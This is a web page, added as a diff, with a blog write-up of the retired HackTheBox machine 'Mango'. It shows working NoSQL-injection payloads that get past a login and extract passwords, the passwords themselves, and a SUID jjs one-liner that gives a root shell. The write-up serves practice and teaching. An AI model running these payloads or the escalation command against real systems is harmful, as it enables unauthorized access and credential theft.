@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Mango | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2020/04/htb-mango.html" title="Read more" class="entry-title-link">
+                HTB: Mango</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-04-19T11:25:00+02:00">19 Apr 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/nosql.html" title="Read more with the label NoSQL" class="meta-link">NoSQL</a> 
+          <a href="../../tag/suid.html" title="Read more with the label SUID" class="meta-link">SUID</a> 
+          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 9 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2020.04/mango_card.png" alt="Mango card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/214">Mango</a> publish by
+<a href="https://www.hackthebox.eu/home/users/profile/13531">MrR3boot</a> on October 26
+2019.
+This box is classified as a medium machine. It involves a interesting NoSQL injection
+and a SUID binary.</p>
+
+
+<h1 id="recon">Recon</h1>
+<p>We start with an nmap scan. Only the ports 22 (SSH) 80 (HTTP) and 443 (HTTPS) are open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Thu Nov 21 13:22:00 2019 as: nmap -p- -sSV -oA nmap 10.10.10.162</span>
+<span class="code-line">Nmap scan report for 10.10.10.162</span>
+<span class="code-line">Host is up (0.086s latency).</span>
+<span class="code-line">Not shown: 65532 closed ports</span>
+<span class="code-line">PORT    STATE SERVICE  VERSION</span>
+<span class="code-line">22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span>
+<span class="code-line">80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))</span>
+<span class="code-line">443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))</span>
+<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="code-line"># Nmap done at Thu Nov 21 13:24:55 2019 -- 1 IP address (1 host up) scanned in 175.48 seconds</span>
+<span class="code-line"># Web</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can run a dirb on both ports but this won't give use any lead.</p>
+<p>The website on port 443 is a search engine with an analytic part allowing to
+connect to a remote elastic search.</p>
+<p>When looking at the SSL certificate we get some information about a subdomain
+"staging-order.mango.htb". We add an entry to our <code>/etc/hosts</code> and are able to
+access the website.</p>
+<p><img alt="Mango certificat" src="/media/2020.04/mango_1.png"></p>
+<p>The web page is a simple authentication form.</p>
+<p><img alt="Mango login page" src="/media/2020.04/mango_2.png"></p>
+<h1 id="nosql-injection">NoSQL injection</h1>
+<p>The name of the box: Mango is a hint about the framework used. First off all I
+thought about <a href="https://www.mongodb.com/">MangoDB</a> but there is also a lot of
+framework named "mango" like <a href="https://mangomap.com">Mangomap</a> or <a href="https://www.mangoapps.com/">Mangoapps</a>.</p>
+<p>MangoDB is a <a href="https://en.wikipedia.org/wiki/NoSQL">NoSQL</a> database. Classical
+SQL injections will not work on it. But there is specific
+[NoSQL Injection] (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)</p>
+<p>When we try to login as "admin" with the password "place" the POST parameters
+are the following: <code>username=admin&amp;password=place&amp;login=login</code></p>
+<p>We edit the request with Burp and send the following:
+<code>username=admin&amp;password[%24ne]=place&amp;login=login</code></p>
+<p>We bypass the authentication and are logged in as admin. But the new page is
+a static page with just some SVG images and a message indicating that the site
+is building.</p>
+<p><img alt="Mango plantation" src="/media/2020.04/mango_3.png"></p>
+<p><strong>note:</strong> I realized after exploiting the following that I was not getting the
+information about admin password but an other account as my payload have a
+<code>[$ne]</code> (not equal) in the username parameter.</p>
+<p>We can get more information about the admin password's length using some
+"regex". By incrementing the following numeric parameter with Burp repeater (or
+intruder) in the following query
+we can learn that the admin password is 16 characters long. In fact the
+application send back a redirection until the parameter is 17 then just sending a 200.</p>
+<p><code>username[%24ne]=admin&amp;password[%24regex]=.{16}&amp;login=login</code></p>
+<p>Then we can get the password character by character using the intruder and
+<a href="https://github.com/maggick/vrac/blob/master/printable_chars">a list of printable characters</a>
+and a specific payload. When sorting the application answers by Status code we
+get the characters.</p>
+<p><img alt="Mango getting the password" src="/media/2020.04/mango_4.png"></p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>username[%24ne]=admin&amp;password[%24regex]=h3§q§.{13}&amp;login=login</span>
+<span class="code-line">username[%24ne]=admin&amp;password[%24regex]=h3m§q§.{12}&amp;login=login</span>
+<span class="code-line">username[%24ne]=admin&amp;password[%24regex]=h3mXK8RhU§q§.{6}&amp;login=login</span>
+<span class="code-line">username[%24ne]=admin&amp;password[%24regex]=h3mXK8RhU~f{]f5§q§.{0}&amp;login=login</span>
+<span class="code-line"></code></pre></div>
+
+<p>We finally get the password <code>h3mXK8RhU~f{]f5H</code>. We try to login with it but this
+not the admin password as mentioned earlier. We repeat the process with the
+following payload and get the admin password <code>t9KcS3&gt;!0B#2</code>.</p>
+<p><code>username=admin&amp;password[%24regex]=§a§.{12}&amp;login=login</code></p>
+<h1 id="getting-user">Getting user</h1>
+<p>The admin password is working. But we cannot use it to connect using SSH. We
+need to find the other user. After some guessing we found that the other user is
+simply "mango". We can then connect to the box using SSH and the previous
+password.</p>
+<p>The user flag is not in the mango user home folder. We need to login as the
+admin user. A simple <code>su admin</code> with the previously found password do the trick.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>mango@mango:~$ su admin</span>
+<span class="code-line">Password: </span>
+<span class="code-line">$ cd</span>
+<span class="code-line">$ ls</span>
+<span class="code-line">jjs  user.txt</span>
+<span class="code-line">$ cat user.txt</span>
+<span class="code-line">79bf31&lt;redacted&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="getting-root">Getting root</h1>
+<p>We start enumerating the box for privileges escalation. Listing our <code>sudo</code> right
+and the SUID binaries.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>admin@mango:/home/admin$ sudo -l</span>
+<span class="code-line">[sudo] password for admin: </span>
+<span class="code-line">Sorry, user admin may not run sudo on mango.</span>
+<span class="code-line">admin@mango:/home/admin$ find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;</span>
+<span class="code-line">-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount</span>
+<span class="code-line">-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount</span>
+<span class="code-line">-rwsr-xr-x 1 root root 26696 Oct 15  2018 /bin/umount</span>
+<span class="code-line">-rwsr-xr-x 1 root root 44664 Jan 25  2018 /bin/su</span>
+<span class="code-line">-rwsr-xr-x 1 root root 64424 Mar  9  2017 /bin/ping</span>
+<span class="code-line">-rwsr-xr-x 1 root root 40152 May 15  2019 /snap/core/7713/bin/mount</span>
+<span class="code-line">-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7713/bin/ping</span>
+<span class="code-line">-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7713/bin/ping6</span>
+<span class="code-line">-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7713/bin/su</span>
+<span class="code-line">-rwsr-xr-x 1 root root 27608 May 15  2019 /snap/core/7713/bin/umount</span>
+<span class="code-line">-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7713/usr/bin/chfn</span>
+<span class="code-line">-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7713/usr/bin/chsh</span>
+<span class="code-line">-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7713/usr/bin/gpasswd</span>
+<span class="code-line">-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7713/usr/bin/newgrp</span>
+<span class="code-line">-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7713/usr/bin/passwd</span>
+<span class="code-line">-rwsr-xr-x 1 root root 136808 Jun 10 22:53 /snap/core/7713/usr/bin/sudo</span>
+<span class="code-line">-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10 19:46 /snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+<span class="code-line">-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7713/usr/lib/openssh/ssh-keysign</span>
+<span class="code-line">-rwsr-sr-x 1 root root 106696 Aug 30 07:09 /snap/core/7713/usr/lib/snapd/snap-confine</span>
+<span class="code-line">-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7713/usr/sbin/pppd</span>
+<span class="code-line">-rwsr-xr-x 1 root root 40152 May 16  2018 /snap/core/6350/bin/mount</span>
+<span class="code-line">-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/6350/bin/ping</span>
+<span class="code-line">-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/6350/bin/ping6</span>
+<span class="code-line">-rwsr-xr-x 1 root root 40128 May 17  2017 /snap/core/6350/bin/su</span>
+<span class="code-line">-rwsr-xr-x 1 root root 27608 May 16  2018 /snap/core/6350/bin/umount</span>
+<span class="code-line">-rwsr-xr-x 1 root root 71824 May 17  2017 /snap/core/6350/usr/bin/chfn</span>
+<span class="code-line">-rwsr-xr-x 1 root root 40432 May 17  2017 /snap/core/6350/usr/bin/chsh</span>
+<span class="code-line">-rwsr-xr-x 1 root root 75304 May 17  2017 /snap/core/6350/usr/bin/gpasswd</span>
+<span class="code-line">-rwsr-xr-x 1 root root 39904 May 17  2017 /snap/core/6350/usr/bin/newgrp</span>
+<span class="code-line">-rwsr-xr-x 1 root root 54256 May 17  2017 /snap/core/6350/usr/bin/passwd</span>
+<span class="code-line">-rwsr-xr-x 1 root root 136808 Jul  4  2017 /snap/core/6350/usr/bin/sudo</span>
+<span class="code-line">-rwsr-xr-- 1 root systemd-resolve 42992 Jan 12  2017 /snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+<span class="code-line">-rwsr-xr-x 1 root root 428240 Nov  5  2018 /snap/core/6350/usr/lib/openssh/ssh-keysign</span>
+<span class="code-line">-rwsr-sr-x 1 root root 98472 Jan 29  2019 /snap/core/6350/usr/lib/snapd/snap-confine</span>
+<span class="code-line">-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/6350/usr/sbin/pppd</span>
+<span class="code-line">-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newuidmap</span>
+<span class="code-line">-rwsr-xr-x 1 root root 40344 Jan 25  2018 /usr/bin/newgrp</span>
+<span class="code-line">-rwsr-xr-x 1 root root 75824 Jan 25  2018 /usr/bin/gpasswd</span>
+<span class="code-line">-rwsr-xr-x 1 root root 59640 Jan 25  2018 /usr/bin/passwd</span>
+<span class="code-line">-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newgidmap</span>
+<span class="code-line">-rwsr-sr-x 1 root root 18161 Jul 15  2016 /usr/bin/run-mailcap</span>
+<span class="code-line">-rwsr-xr-x 1 root root 76496 Jan 25  2018 /usr/bin/chfn</span>
+<span class="code-line">-rwsr-xr-x 1 root root 44528 Jan 25  2018 /usr/bin/chsh</span>
+<span class="code-line">-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo</span>
+<span class="code-line">-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at</span>
+<span class="code-line">-rwsr-xr-x 1 root root 18448 Mar  9  2017 /usr/bin/traceroute6.iputils</span>
+<span class="code-line">-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec</span>
+<span class="code-line">-rwsr-xr-- 1 root messagebus 42992 Jun 10 18:05 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+<span class="code-line">-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span>
+<span class="code-line">-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1</span>
+<span class="code-line">-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span>
+<span class="code-line">-rwsr-sr-- 1 root admin 10352 Jul 18 18:21 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</span>
+<span class="code-line">-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign</span>
+<span class="code-line">-rwsr-sr-x 1 root root 101240 Mar 15  2019 /usr/lib/snapd/snap-confine</span>
+<span class="code-line"></code></pre></div>
+
+<p>We search for the binaries on GTFObins and <a href="https://gtfobins.github.io/gtfobins/jjs/#suid">jjs</a>
+get our attention. We can directly use the gtfobins command but the process just hang.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>admin@mango:/home/mango$ echo &quot;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;).waitFor()&quot; | /usr/lib/jvm/java-11-openjdk-/bin/jjs</span>
+<span class="code-line">Warning: The jjs tool is planned to be removed from a future JDK release</span>
+<span class="code-line">jjs&gt; Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc $@|sh${IFS}-p _ echo sh -p &lt;/dev/pts/0 &gt;/dev/pts/0 2&gt;/dev/pts/0&#39;).waitFor()</span>
+<span class="code-line">#</span>
+<span class="code-line"></code></pre></div>
+
+<p>We modify the command to use <code>/bin/bash</code> instead of <code>sh</code> and it work (the user input are
+not prompted when typing but when you hit enter it gives the command result).
+The first command is <code>id</code> the second is <code>cat /root/root.txt</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>admin@mango:/home/mango$ echo &quot;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc \$@|sh\${IFS}-p _ echo /bin/bash -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;).waitFor()&quot; | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</span>
+<span class="code-line">Warning: The jjs tool is planned to be removed from a future JDK release</span>
+<span class="code-line">jjs&gt; Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc $@|sh${IFS}-p _ echo /bin/bash -p &lt;/dev/pts/0 &gt;/dev/pts/0 2&gt;/dev/pts/0&#39;).waitFor()</span>
+<span class="code-line">bash-4.4# uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)</span>
+<span class="code-line">bash-4.4# 8a8ef&lt;redacted&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>The NoSQL injection was quit fun. Doing it manually with Burp was really
+interesting.</p>
+<p>The <code>jjs</code> privilege escalation was not really hard.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2020/04/dawgctf-2020.html"> DawgCTF 2020 </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2020/04/hackpack-ctf-2020.html"> Hackpack CTF 2020 </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
